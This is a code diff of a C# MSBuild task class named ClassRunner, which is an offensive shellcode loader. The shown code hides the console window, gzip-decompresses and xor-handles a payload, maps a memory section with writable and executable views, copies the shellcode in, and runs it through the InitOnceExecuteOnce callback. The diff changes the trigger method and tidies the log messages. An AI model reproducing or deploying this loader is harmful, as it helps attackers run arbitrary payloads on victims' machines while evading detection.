@@ -26,9 +26,6 @@ public class ClassRunner : Task, ITask
         public static readonly INIT_ONCE INIT_ONCE_STATIC_INIT = new INIT_ONCE();
     }
 
-    [UnmanagedFunctionPointerAttribute(CallingConvention.Cdecl)]
-    private delegate Int32 Initialize();
-
     public override bool Execute()
     {
         ShowWindow(GetConsoleWindow(), 0);
@@ -49,17 +46,13 @@ public class ClassRunner : Task, ITask
         rawShellcode = Gzip.Decompress(rawShellcode);
 
         // Create local section, map two views RW + RX, copy shellcode to RW
-        Console.WriteLine("\n[>] Creating local section..");
+        Console.WriteLine("[>] Creating local section..");
         SECT_DATA LocalSect = MapLocalSectionAndWrite(rawShellcode);
 
-        Console.WriteLine("\n[>] Triggering shellcode using InitOnceExecuteOnce!");
-        //Initialize del = (Initialize)Marshal.GetDelegateForFunctionPointer(LocalSect.pBase, typeof(Initialize));
-        //del();
+        Console.WriteLine("[>] Triggering shellcode using InitOnceExecuteOnce!");
         INIT_ONCE gInitOnce = new INIT_ONCE();
         IntPtr ctx;
-        InitOnceExecuteOnce(ref gInitOnce, LocalSect.pBase, IntPtr.Zero, out ctx);
-
-        return true;
+        return InitOnceExecuteOnce(ref gInitOnce, LocalSect.pBase, IntPtr.Zero, out ctx);
     }
 
     static byte[] xor(byte[] data, byte[] key)
